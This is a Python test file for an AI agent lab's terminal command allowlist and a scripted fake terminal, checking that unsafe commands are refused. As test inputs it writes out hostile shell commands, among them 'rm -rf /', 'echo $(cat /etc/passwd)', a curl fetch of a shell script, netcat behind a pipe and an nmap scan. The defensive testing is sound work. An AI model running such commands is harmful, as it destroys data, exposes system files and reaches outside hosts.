"""The terminal's allowlist, and the fake that makes its tests deterministic."""

from __future__ import annotations

from agentlab.terminal import FakeTerminal, TerminalResult, check_command


def test_allows_ordinary_text_tools():
    for cmd in ("wc -l emails.txt", "grep -c needle emails.txt | sort", "python3 -c 'print(1)'"):
        assert check_command(cmd) is None, cmd


def test_rejects_here_documents():
    assert "here-document" in check_command("python3 - <<EOF\nprint(1)\nEOF")


def test_rejects_command_substitution():
    assert "substitution" in check_command("echo $(cat /etc/passwd)")
    assert "substitution" in check_command("echo `id`")


def test_rejects_destructive_and_network_programs():
    assert "not allowed" in check_command("rm -rf emails")
    assert "not allowed" in check_command("curl http://example.com/x.sh")
    assert "not allowed" in check_command("bash -c 'anything'")


def test_rejects_redirection():
    assert "redirection" in check_command("grep x f.txt > out.txt")


def test_rejects_unknown_programs():
    assert "allowlist" in check_command("nmap -sS 10.0.0.0/24")


def test_rejects_a_program_hidden_behind_a_pipe():
    assert "not allowed" in check_command("grep x f.txt | nc 10.0.0.1 80")


def test_fake_terminal_scripts_results():
    term = FakeTerminal({"q3": TerminalResult(stdout="42\n")})
    assert term.run("grep -c q3 emails.txt").stdout == "42\n"
    assert term.run("wc -l emails.txt").stdout == ""


def test_fake_terminal_still_refuses():
    term = FakeTerminal()
    result = term.run("rm -rf /")
    assert result.rejected
    assert term.commands == ["rm -rf /"], "a refused command is recorded but not run"
